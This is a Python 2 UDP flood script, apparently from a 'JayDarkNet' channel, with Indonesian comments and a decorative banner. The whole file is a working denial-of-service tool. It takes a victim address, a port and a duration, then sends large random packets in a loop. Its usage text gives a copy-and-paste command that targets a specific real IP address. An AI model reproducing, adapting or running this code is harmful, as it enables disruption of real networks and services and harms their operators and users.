



import time
import socket
import random
import os
import sys
def usage():
    os.system('clear')
    print "\033[1;97m"
    print "    /\_/\           ___"
    print "   = o_o =_______    \ \  -Subscribe JayDarkNet OFFICIAL-"
    print "    __^      __(  \.__) )"
    print "(@)<_____>__(_____)____/"
    print "=================================================="
    print "Youtube \033[1;91m:\033[1;96mJayDarkNet OFFICIAL\033[1;97m"
    print "Github  \033[1;91m:\033[1;92mhttps://github.com/JayDarkNet404-02\033[1;97m"
    print "salin lalu tempel\033[1;91m:\033[1;96m python2 server_wifi.py 216.239.38.120 8080 99999999\033[1;97m"
    print "=================================================="
def flood(victim, vport, duration):
    # Support us yaakk... :)
    # Okey Jadi disini saya membuat server, Ketika saya memanggil "SOCK_DGRAM" itu  menunjukkan  UDP type program
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # 20000 representasi satu byte ke server
    bytes = random._urandom(20000)
    timeout =  time.time() + duration
    sent = 3000

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 2
        print "\033[93mMemulai \033[1;96m(>O_O)>\033[1;91m{ \033[1;96m%s \033[1;91m}\033[1;96m<(O_O<)\033[1;32mmengirim paket \033[95m%s \033[1;32mpada port \033[1;32m%s "%(sent, victim, vport)
def main():
    print len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()
